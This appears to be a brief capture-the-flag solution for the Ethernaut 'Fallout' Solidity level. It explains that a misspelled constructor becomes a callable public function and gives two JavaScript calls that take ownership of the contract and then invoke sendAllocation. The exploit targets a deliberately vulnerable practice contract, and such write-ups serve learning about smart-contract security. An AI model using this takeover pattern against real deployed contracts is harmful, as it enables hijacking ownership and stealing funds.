# Day 2 - Fallout

Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.

```js
await contract.Fal1out({ value: 0.1234 });
await contract.sendAllocation(await contract.owner());
```
